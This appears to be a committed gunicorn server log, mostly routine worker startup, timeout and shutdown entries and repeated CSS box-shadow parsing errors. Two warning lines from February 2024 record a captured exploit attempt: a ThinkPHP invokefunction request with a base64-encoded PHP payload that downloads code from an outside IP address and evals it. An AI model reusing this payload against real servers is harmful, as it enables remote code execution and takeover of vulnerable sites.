@@ -1,0 +1,275 @@
+[2024-01-23 21:30:33 +0800] [10065] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 21:30:33 +0800] [10065] [INFO] Listening at: http://127.0.0.1:8000 (10065)
+[2024-01-23 21:30:33 +0800] [10065] [INFO] Using worker: sync
+[2024-01-23 21:30:33 +0800] [10107] [INFO] Booting worker with pid: 10107
+[2024-01-23 21:30:33 +0800] [10108] [INFO] Booting worker with pid: 10108
+[2024-01-23 21:30:33 +0800] [10109] [INFO] Booting worker with pid: 10109
+[2024-01-23 21:30:33 +0800] [10110] [INFO] Booting worker with pid: 10110
+[2024-01-23 21:30:33 +0800] [10111] [INFO] Booting worker with pid: 10111
+[2024-01-23 22:20:12 +0800] [10065] [CRITICAL] WORKER TIMEOUT (pid:10108)
+[2024-01-23 22:20:12 +0800] [10108] [INFO] Worker exiting (pid: 10108)
+[2024-01-23 22:20:12 +0800] [10065] [ERROR] Worker (pid:10108) exited with code 1
+[2024-01-23 22:20:12 +0800] [10065] [ERROR] Worker (pid:10108) exited with code 1.
+[2024-01-23 22:20:12 +0800] [14597] [INFO] Booting worker with pid: 14597
+[2024-01-23 22:23:00 +0800] [10065] [CRITICAL] WORKER TIMEOUT (pid:10110)
+[2024-01-23 22:23:00 +0800] [10110] [INFO] Worker exiting (pid: 10110)
+[2024-01-23 22:23:00 +0800] [10065] [ERROR] Worker (pid:10110) exited with code 1
+[2024-01-23 22:23:00 +0800] [10065] [ERROR] Worker (pid:10110) exited with code 1.
+[2024-01-23 22:23:00 +0800] [14601] [INFO] Booting worker with pid: 14601
+[2024-01-23 22:32:42 +0800] [10065] [INFO] Handling signal: term
+[2024-01-23 22:32:42 +0800] [10109] [INFO] Worker exiting (pid: 10109)
+[2024-01-23 22:32:42 +0800] [10107] [INFO] Worker exiting (pid: 10107)
+[2024-01-23 22:32:42 +0800] [10111] [INFO] Worker exiting (pid: 10111)
+[2024-01-23 22:32:42 +0800] [14597] [INFO] Worker exiting (pid: 14597)
+[2024-01-23 22:32:42 +0800] [14601] [INFO] Worker exiting (pid: 14601)
+[2024-01-23 22:32:42 +0800] [10065] [INFO] Shutting down: Master
+[2024-01-23 22:32:44 +0800] [14846] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 22:32:44 +0800] [14846] [INFO] Listening at: http://127.0.0.1:8000 (14846)
+[2024-01-23 22:32:44 +0800] [14846] [INFO] Using worker: sync
+[2024-01-23 22:32:44 +0800] [14854] [INFO] Booting worker with pid: 14854
+[2024-01-23 22:32:44 +0800] [14855] [INFO] Booting worker with pid: 14855
+[2024-01-23 22:32:44 +0800] [14856] [INFO] Booting worker with pid: 14856
+[2024-01-23 22:32:44 +0800] [14857] [INFO] Booting worker with pid: 14857
+[2024-01-23 22:32:44 +0800] [14858] [INFO] Booting worker with pid: 14858
+[2024-01-23 22:33:55 +0800] [14846] [INFO] Handling signal: term
+[2024-01-23 22:33:55 +0800] [14856] [INFO] Worker exiting (pid: 14856)
+[2024-01-23 22:33:55 +0800] [14857] [INFO] Worker exiting (pid: 14857)
+[2024-01-23 22:33:55 +0800] [14854] [INFO] Worker exiting (pid: 14854)
+[2024-01-23 22:33:55 +0800] [14858] [INFO] Worker exiting (pid: 14858)
+[2024-01-23 22:33:55 +0800] [14855] [INFO] Worker exiting (pid: 14855)
+[2024-01-23 22:33:56 +0800] [14846] [INFO] Shutting down: Master
+[2024-01-23 22:33:57 +0800] [14990] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 22:33:57 +0800] [14990] [INFO] Listening at: http://127.0.0.1:8000 (14990)
+[2024-01-23 22:33:57 +0800] [14990] [INFO] Using worker: sync
+[2024-01-23 22:33:57 +0800] [14998] [INFO] Booting worker with pid: 14998
+[2024-01-23 22:33:57 +0800] [14999] [INFO] Booting worker with pid: 14999
+[2024-01-23 22:33:57 +0800] [15000] [INFO] Booting worker with pid: 15000
+[2024-01-23 22:33:58 +0800] [15005] [INFO] Booting worker with pid: 15005
+[2024-01-23 22:33:58 +0800] [15006] [INFO] Booting worker with pid: 15006
+[2024-01-23 22:39:25 +0800] [14990] [INFO] Handling signal: term
+[2024-01-23 22:39:25 +0800] [14999] [INFO] Worker exiting (pid: 14999)
+[2024-01-23 22:39:25 +0800] [14998] [INFO] Worker exiting (pid: 14998)
+[2024-01-23 22:39:25 +0800] [15006] [INFO] Worker exiting (pid: 15006)
+[2024-01-23 22:39:25 +0800] [15000] [INFO] Worker exiting (pid: 15000)
+[2024-01-23 22:39:25 +0800] [15005] [INFO] Worker exiting (pid: 15005)
+[2024-01-23 22:39:25 +0800] [14990] [INFO] Shutting down: Master
+[2024-01-23 22:39:27 +0800] [15200] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 22:39:27 +0800] [15200] [INFO] Listening at: http://127.0.0.1:8000 (15200)
+[2024-01-23 22:39:27 +0800] [15200] [INFO] Using worker: sync
+[2024-01-23 22:39:27 +0800] [15208] [INFO] Booting worker with pid: 15208
+[2024-01-23 22:39:27 +0800] [15209] [INFO] Booting worker with pid: 15209
+[2024-01-23 22:39:27 +0800] [15210] [INFO] Booting worker with pid: 15210
+[2024-01-23 22:39:27 +0800] [15214] [INFO] Booting worker with pid: 15214
+[2024-01-23 22:39:27 +0800] [15215] [INFO] Booting worker with pid: 15215
+[2024-01-23 22:50:10 +0800] [15200] [INFO] Handling signal: term
+[2024-01-23 22:50:10 +0800] [15209] [INFO] Worker exiting (pid: 15209)
+[2024-01-23 22:50:10 +0800] [15214] [INFO] Worker exiting (pid: 15214)
+[2024-01-23 22:50:10 +0800] [15215] [INFO] Worker exiting (pid: 15215)
+[2024-01-23 22:50:10 +0800] [15210] [INFO] Worker exiting (pid: 15210)
+[2024-01-23 22:50:10 +0800] [15208] [INFO] Worker exiting (pid: 15208)
+[2024-01-23 22:50:10 +0800] [15200] [INFO] Shutting down: Master
+[2024-01-23 22:50:12 +0800] [15442] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 22:50:12 +0800] [15442] [INFO] Listening at: http://127.0.0.1:8000 (15442)
+[2024-01-23 22:50:12 +0800] [15442] [INFO] Using worker: sync
+[2024-01-23 22:50:12 +0800] [15450] [INFO] Booting worker with pid: 15450
+[2024-01-23 22:50:12 +0800] [15451] [INFO] Booting worker with pid: 15451
+[2024-01-23 22:50:12 +0800] [15452] [INFO] Booting worker with pid: 15452
+[2024-01-23 22:50:12 +0800] [15453] [INFO] Booting worker with pid: 15453
+[2024-01-23 22:50:12 +0800] [15454] [INFO] Booting worker with pid: 15454
+[2024-01-23 22:56:17 +0800] [15442] [INFO] Handling signal: term
+[2024-01-23 22:56:17 +0800] [15451] [INFO] Worker exiting (pid: 15451)
+[2024-01-23 22:56:17 +0800] [15454] [INFO] Worker exiting (pid: 15454)
+[2024-01-23 22:56:17 +0800] [15450] [INFO] Worker exiting (pid: 15450)
+[2024-01-23 22:56:17 +0800] [15452] [INFO] Worker exiting (pid: 15452)
+[2024-01-23 22:56:17 +0800] [15453] [INFO] Worker exiting (pid: 15453)
+[2024-01-23 22:56:17 +0800] [15442] [INFO] Shutting down: Master
+[2024-01-23 22:56:19 +0800] [15771] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 22:56:19 +0800] [15771] [INFO] Listening at: http://127.0.0.1:8000 (15771)
+[2024-01-23 22:56:19 +0800] [15771] [INFO] Using worker: sync
+[2024-01-23 22:56:19 +0800] [15784] [INFO] Booting worker with pid: 15784
+[2024-01-23 22:56:19 +0800] [15788] [INFO] Booting worker with pid: 15788
+[2024-01-23 22:56:19 +0800] [15789] [INFO] Booting worker with pid: 15789
+[2024-01-23 22:56:19 +0800] [15790] [INFO] Booting worker with pid: 15790
+[2024-01-23 22:56:19 +0800] [15791] [INFO] Booting worker with pid: 15791
+[2024-01-23 22:59:57 +0800] [15771] [INFO] Handling signal: term
+[2024-01-23 22:59:57 +0800] [15788] [INFO] Worker exiting (pid: 15788)
+[2024-01-23 22:59:57 +0800] [15789] [INFO] Worker exiting (pid: 15789)
+[2024-01-23 22:59:57 +0800] [15790] [INFO] Worker exiting (pid: 15790)
+[2024-01-23 22:59:57 +0800] [15791] [INFO] Worker exiting (pid: 15791)
+[2024-01-23 22:59:57 +0800] [15784] [INFO] Worker exiting (pid: 15784)
+[2024-01-23 22:59:57 +0800] [15771] [INFO] Shutting down: Master
+[2024-01-23 22:59:59 +0800] [16076] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 22:59:59 +0800] [16076] [INFO] Listening at: http://127.0.0.1:8000 (16076)
+[2024-01-23 22:59:59 +0800] [16076] [INFO] Using worker: sync
+[2024-01-23 22:59:59 +0800] [16084] [INFO] Booting worker with pid: 16084
+[2024-01-23 22:59:59 +0800] [16085] [INFO] Booting worker with pid: 16085
+[2024-01-23 22:59:59 +0800] [16086] [INFO] Booting worker with pid: 16086
+[2024-01-23 22:59:59 +0800] [16087] [INFO] Booting worker with pid: 16087
+[2024-01-23 22:59:59 +0800] [16088] [INFO] Booting worker with pid: 16088
+[2024-01-23 23:03:48 +0800] [16076] [INFO] Handling signal: term
+[2024-01-23 23:03:48 +0800] [16085] [INFO] Worker exiting (pid: 16085)
+[2024-01-23 23:03:48 +0800] [16088] [INFO] Worker exiting (pid: 16088)
+[2024-01-23 23:03:48 +0800] [16087] [INFO] Worker exiting (pid: 16087)
+[2024-01-23 23:03:48 +0800] [16084] [INFO] Worker exiting (pid: 16084)
+[2024-01-23 23:03:48 +0800] [16086] [INFO] Worker exiting (pid: 16086)
+[2024-01-23 23:03:49 +0800] [16076] [INFO] Shutting down: Master
+[2024-01-23 23:03:50 +0800] [16355] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 23:03:50 +0800] [16355] [INFO] Listening at: http://127.0.0.1:8000 (16355)
+[2024-01-23 23:03:50 +0800] [16355] [INFO] Using worker: sync
+[2024-01-23 23:03:50 +0800] [16363] [INFO] Booting worker with pid: 16363
+[2024-01-23 23:03:50 +0800] [16364] [INFO] Booting worker with pid: 16364
+[2024-01-23 23:03:51 +0800] [16365] [INFO] Booting worker with pid: 16365
+[2024-01-23 23:03:51 +0800] [16366] [INFO] Booting worker with pid: 16366
+[2024-01-23 23:03:51 +0800] [16367] [INFO] Booting worker with pid: 16367
+[2024-01-23 23:07:36 +0800] [16355] [INFO] Handling signal: term
+[2024-01-23 23:07:36 +0800] [16363] [INFO] Worker exiting (pid: 16363)
+[2024-01-23 23:07:36 +0800] [16364] [INFO] Worker exiting (pid: 16364)
+[2024-01-23 23:07:36 +0800] [16367] [INFO] Worker exiting (pid: 16367)
+[2024-01-23 23:07:36 +0800] [16366] [INFO] Worker exiting (pid: 16366)
+[2024-01-23 23:07:36 +0800] [16365] [INFO] Worker exiting (pid: 16365)
+[2024-01-23 23:07:36 +0800] [16355] [INFO] Shutting down: Master
+[2024-01-23 23:07:38 +0800] [16644] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 23:07:38 +0800] [16644] [INFO] Listening at: http://127.0.0.1:8000 (16644)
+[2024-01-23 23:07:38 +0800] [16644] [INFO] Using worker: sync
+[2024-01-23 23:07:38 +0800] [16652] [INFO] Booting worker with pid: 16652
+[2024-01-23 23:07:38 +0800] [16653] [INFO] Booting worker with pid: 16653
+[2024-01-23 23:07:38 +0800] [16654] [INFO] Booting worker with pid: 16654
+[2024-01-23 23:07:38 +0800] [16655] [INFO] Booting worker with pid: 16655
+[2024-01-23 23:07:38 +0800] [16656] [INFO] Booting worker with pid: 16656
+[2024-01-23 23:19:11 +0800] [16644] [INFO] Handling signal: term
+[2024-01-23 23:19:11 +0800] [16652] [INFO] Worker exiting (pid: 16652)
+[2024-01-23 23:19:11 +0800] [16655] [INFO] Worker exiting (pid: 16655)
+[2024-01-23 23:19:11 +0800] [16653] [INFO] Worker exiting (pid: 16653)
+[2024-01-23 23:19:11 +0800] [16654] [INFO] Worker exiting (pid: 16654)
+[2024-01-23 23:19:11 +0800] [16656] [INFO] Worker exiting (pid: 16656)
+[2024-01-23 23:19:11 +0800] [16644] [INFO] Shutting down: Master
+[2024-01-23 23:19:13 +0800] [17237] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 23:19:13 +0800] [17237] [INFO] Listening at: http://127.0.0.1:8000 (17237)
+[2024-01-23 23:19:13 +0800] [17237] [INFO] Using worker: sync
+[2024-01-23 23:19:13 +0800] [17245] [INFO] Booting worker with pid: 17245
+[2024-01-23 23:19:13 +0800] [17246] [INFO] Booting worker with pid: 17246
+[2024-01-23 23:19:13 +0800] [17247] [INFO] Booting worker with pid: 17247
+[2024-01-23 23:19:13 +0800] [17248] [INFO] Booting worker with pid: 17248
+[2024-01-23 23:19:13 +0800] [17249] [INFO] Booting worker with pid: 17249
+[2024-01-23 23:23:11 +0800] [17237] [INFO] Handling signal: term
+[2024-01-23 23:23:11 +0800] [17246] [INFO] Worker exiting (pid: 17246)
+[2024-01-23 23:23:11 +0800] [17247] [INFO] Worker exiting (pid: 17247)
+[2024-01-23 23:23:11 +0800] [17245] [INFO] Worker exiting (pid: 17245)
+[2024-01-23 23:23:11 +0800] [17248] [INFO] Worker exiting (pid: 17248)
+[2024-01-23 23:23:11 +0800] [17249] [INFO] Worker exiting (pid: 17249)
+[2024-01-23 23:23:11 +0800] [17237] [INFO] Shutting down: Master
+[2024-01-23 23:23:13 +0800] [17590] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 23:23:13 +0800] [17590] [INFO] Listening at: http://127.0.0.1:8000 (17590)
+[2024-01-23 23:23:13 +0800] [17590] [INFO] Using worker: sync
+[2024-01-23 23:23:13 +0800] [17599] [INFO] Booting worker with pid: 17599
+[2024-01-23 23:23:13 +0800] [17600] [INFO] Booting worker with pid: 17600
+[2024-01-23 23:23:13 +0800] [17601] [INFO] Booting worker with pid: 17601
+[2024-01-23 23:23:13 +0800] [17602] [INFO] Booting worker with pid: 17602
+[2024-01-23 23:23:13 +0800] [17603] [INFO] Booting worker with pid: 17603
+[2024-01-23 23:26:08 +0800] [17590] [INFO] Handling signal: term
+[2024-01-23 23:26:08 +0800] [17599] [INFO] Worker exiting (pid: 17599)
+[2024-01-23 23:26:08 +0800] [17600] [INFO] Worker exiting (pid: 17600)
+[2024-01-23 23:26:08 +0800] [17602] [INFO] Worker exiting (pid: 17602)
+[2024-01-23 23:26:08 +0800] [17601] [INFO] Worker exiting (pid: 17601)
+[2024-01-23 23:26:08 +0800] [17603] [INFO] Worker exiting (pid: 17603)
+[2024-01-23 23:26:09 +0800] [17590] [INFO] Shutting down: Master
+[2024-01-23 23:26:11 +0800] [17849] [INFO] Starting gunicorn 21.2.0
+[2024-01-23 23:26:11 +0800] [17849] [INFO] Listening at: http://127.0.0.1:8000 (17849)
+[2024-01-23 23:26:11 +0800] [17849] [INFO] Using worker: sync
+[2024-01-23 23:26:11 +0800] [17857] [INFO] Booting worker with pid: 17857
+[2024-01-23 23:26:11 +0800] [17858] [INFO] Booting worker with pid: 17858
+[2024-01-23 23:26:11 +0800] [17859] [INFO] Booting worker with pid: 17859
+[2024-01-23 23:26:11 +0800] [17860] [INFO] Booting worker with pid: 17860
+[2024-01-23 23:26:11 +0800] [17861] [INFO] Booting worker with pid: 17861
+ERROR	PropertyValue: Missing token for production Choice(ColorValue, Dimension, URIValue, Value, variable, MSValue, CSSCalc, function): ('HASH', '#0000001a', 1, 3215)
+ERROR	PropertyValue: Unknown syntax or no value: 0 3px 6px #0000001a
+ERROR	CSSStyleDeclaration: Syntax Error in Property: box-shadow:0 3px 6px #0000001a
+[2024-01-24 00:36:16 +0800] [17849] [INFO] Handling signal: term
+[2024-01-24 00:36:16 +0800] [17858] [INFO] Worker exiting (pid: 17858)
+[2024-01-24 00:36:16 +0800] [17857] [INFO] Worker exiting (pid: 17857)
+[2024-01-24 00:36:16 +0800] [17859] [INFO] Worker exiting (pid: 17859)
+[2024-01-24 00:36:16 +0800] [17860] [INFO] Worker exiting (pid: 17860)
+[2024-01-24 00:36:16 +0800] [17861] [INFO] Worker exiting (pid: 17861)
+[2024-01-24 00:36:16 +0800] [17849] [INFO] Shutting down: Master
+[2024-01-24 00:36:18 +0800] [20776] [INFO] Starting gunicorn 21.2.0
+[2024-01-24 00:36:18 +0800] [20776] [INFO] Listening at: http://127.0.0.1:8000 (20776)
+[2024-01-24 00:36:18 +0800] [20776] [INFO] Using worker: sync
+[2024-01-24 00:36:18 +0800] [20785] [INFO] Booting worker with pid: 20785
+[2024-01-24 00:36:18 +0800] [20786] [INFO] Booting worker with pid: 20786
+[2024-01-24 00:36:18 +0800] [20787] [INFO] Booting worker with pid: 20787
+[2024-01-24 00:36:18 +0800] [20791] [INFO] Booting worker with pid: 20791
+[2024-01-24 00:36:18 +0800] [20792] [INFO] Booting worker with pid: 20792
+[2024-01-30 23:05:31 +0800] [20776] [INFO] Handling signal: term
+[2024-01-30 23:05:31 +0800] [20791] [INFO] Worker exiting (pid: 20791)
+[2024-01-30 23:05:31 +0800] [20786] [INFO] Worker exiting (pid: 20786)
+[2024-01-30 23:05:31 +0800] [20787] [INFO] Worker exiting (pid: 20787)
+[2024-01-30 23:05:31 +0800] [20792] [INFO] Worker exiting (pid: 20792)
+[2024-01-30 23:05:31 +0800] [20785] [INFO] Worker exiting (pid: 20785)
+[2024-01-30 23:05:31 +0800] [20776] [INFO] Shutting down: Master
+[2024-01-30 23:05:33 +0800] [234466] [INFO] Starting gunicorn 21.2.0
+[2024-01-30 23:05:33 +0800] [234466] [INFO] Listening at: http://127.0.0.1:8000 (234466)
+[2024-01-30 23:05:33 +0800] [234466] [INFO] Using worker: sync
+[2024-01-30 23:05:33 +0800] [234475] [INFO] Booting worker with pid: 234475
+[2024-01-30 23:05:33 +0800] [234476] [INFO] Booting worker with pid: 234476
+[2024-01-30 23:05:33 +0800] [234477] [INFO] Booting worker with pid: 234477
+[2024-01-30 23:05:33 +0800] [234478] [INFO] Booting worker with pid: 234478
+[2024-01-30 23:05:33 +0800] [234479] [INFO] Booting worker with pid: 234479
+[2024-02-03 13:17:39 +0800] [234476] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\'eval(base64_decode("aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpKTt9ZWxzZXskaD1jdXJsX2luaXQoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpO2N1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9IRUFERVIsMCk7ZXZhbChjdXJsX2V4ZWMoJGgpKTtjdXJsX2Nsb3NlKCRoKTt9"));\' HTTP/1.1'
+[2024-02-03 13:17:40 +0800] [234476] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: 'hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\'eval(base64_decode("aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpKTt9ZWxzZXskaD1jdXJsX2luaXQoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpO2N1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9IRUFERVIsMCk7ZXZhbChjdXJsX2V4ZWMoJGgpKTtjdXJsX2Nsb3NlKCRoKTt9"));\' HTTP/1.1'
+[2024-02-14 23:54:41 +0800] [234466] [INFO] Handling signal: term
+[2024-02-14 23:54:41 +0800] [234477] [INFO] Worker exiting (pid: 234477)
+[2024-02-14 23:54:41 +0800] [234476] [INFO] Worker exiting (pid: 234476)
+[2024-02-14 23:54:41 +0800] [234478] [INFO] Worker exiting (pid: 234478)
+[2024-02-14 23:54:41 +0800] [234479] [INFO] Worker exiting (pid: 234479)
+[2024-02-14 23:54:41 +0800] [234475] [INFO] Worker exiting (pid: 234475)
+[2024-02-14 23:54:42 +0800] [234466] [INFO] Shutting down: Master
+[2024-02-14 23:54:44 +0800] [409477] [INFO] Starting gunicorn 21.2.0
+[2024-02-14 23:54:44 +0800] [409477] [INFO] Listening at: http://127.0.0.1:8000 (409477)
+[2024-02-14 23:54:44 +0800] [409477] [INFO] Using worker: sync
+[2024-02-14 23:54:44 +0800] [409485] [INFO] Booting worker with pid: 409485
+[2024-02-14 23:54:44 +0800] [409486] [INFO] Booting worker with pid: 409486
+[2024-02-14 23:54:44 +0800] [409487] [INFO] Booting worker with pid: 409487
+[2024-02-14 23:54:44 +0800] [409488] [INFO] Booting worker with pid: 409488
+[2024-02-14 23:54:44 +0800] [409489] [INFO] Booting worker with pid: 409489
+[2024-02-14 23:59:44 +0800] [409477] [INFO] Handling signal: term
+[2024-02-14 23:59:44 +0800] [409488] [INFO] Worker exiting (pid: 409488)
+[2024-02-14 23:59:44 +0800] [409485] [INFO] Worker exiting (pid: 409485)
+[2024-02-14 23:59:44 +0800] [409486] [INFO] Worker exiting (pid: 409486)
+[2024-02-14 23:59:44 +0800] [409487] [INFO] Worker exiting (pid: 409487)
+[2024-02-14 23:59:44 +0800] [409489] [INFO] Worker exiting (pid: 409489)
+[2024-02-14 23:59:45 +0800] [409477] [INFO] Shutting down: Master
+[2024-02-14 23:59:46 +0800] [409799] [INFO] Starting gunicorn 21.2.0
+[2024-02-14 23:59:46 +0800] [409799] [INFO] Listening at: http://127.0.0.1:8000 (409799)
+[2024-02-14 23:59:46 +0800] [409799] [INFO] Using worker: sync
+[2024-02-14 23:59:46 +0800] [409807] [INFO] Booting worker with pid: 409807
+[2024-02-14 23:59:47 +0800] [409808] [INFO] Booting worker with pid: 409808
+[2024-02-14 23:59:47 +0800] [409809] [INFO] Booting worker with pid: 409809
+[2024-02-14 23:59:47 +0800] [409810] [INFO] Booting worker with pid: 409810
+[2024-02-14 23:59:47 +0800] [409811] [INFO] Booting worker with pid: 409811
+[2024-02-24 00:00:44 +0800] [409799] [INFO] Handling signal: term
+[2024-02-24 00:00:44 +0800] [409807] [INFO] Worker exiting (pid: 409807)
+[2024-02-24 00:00:44 +0800] [409810] [INFO] Worker exiting (pid: 409810)
+[2024-02-24 00:00:44 +0800] [409808] [INFO] Worker exiting (pid: 409808)
+[2024-02-24 00:00:44 +0800] [409811] [INFO] Worker exiting (pid: 409811)
+[2024-02-24 00:00:44 +0800] [409809] [INFO] Worker exiting (pid: 409809)
+[2024-02-24 00:00:44 +0800] [409799] [INFO] Shutting down: Master
+[2024-02-28 19:23:55 +0800] [1249] [INFO] Starting gunicorn 21.2.0
+[2024-02-28 19:23:55 +0800] [1249] [INFO] Listening at: http://127.0.0.1:8000 (1249)
+[2024-02-28 19:23:55 +0800] [1249] [INFO] Using worker: sync
+[2024-02-28 19:23:55 +0800] [1562] [INFO] Booting worker with pid: 1562
+[2024-02-28 19:23:55 +0800] [1563] [INFO] Booting worker with pid: 1563
+[2024-02-28 19:23:55 +0800] [1564] [INFO] Booting worker with pid: 1564
+[2024-02-28 19:23:55 +0800] [1565] [INFO] Booting worker with pid: 1565
+[2024-02-28 19:23:55 +0800] [1566] [INFO] Booting worker with pid: 1566
+ERROR	PropertyValue: Missing token for production Choice(ColorValue, Dimension, URIValue, Value, variable, MSValue, CSSCalc, function): ('HASH', '#0000001a', 1, 3215)
+ERROR	PropertyValue: Unknown syntax or no value: 0 3px 6px #0000001a
+ERROR	CSSStyleDeclaration: Syntax Error in Property: box-shadow:0 3px 6px #0000001a
+ERROR	PropertyValue: Missing token for production Choice(ColorValue, Dimension, URIValue, Value, variable, MSValue, CSSCalc, function): ('HASH', '#0000001a', 1, 3215)
+ERROR	PropertyValue: Unknown syntax or no value: 0 3px 6px #0000001a
+ERROR	CSSStyleDeclaration: Syntax Error in Property: box-shadow:0 3px 6px #0000001a
+ERROR	PropertyValue: Missing token for production Choice(ColorValue, Dimension, URIValue, Value, variable, MSValue, CSSCalc, function): ('HASH', '#0000001a', 1, 3215)
+ERROR	PropertyValue: Unknown syntax or no value: 0 3px 6px #0000001a
+ERROR	CSSStyleDeclaration: Syntax Error in Property: box-shadow:0 3px 6px #0000001a
+ERROR	PropertyValue: Missing token for production Choice(ColorValue, Dimension, URIValue, Value, variable, MSValue, CSSCalc, function): ('HASH', '#0000001a', 1, 3215)
+ERROR	PropertyValue: Unknown syntax or no value: 0 3px 6px #0000001a
+ERROR	CSSStyleDeclaration: Syntax Error in Property: box-shadow:0 3px 6px #0000001a
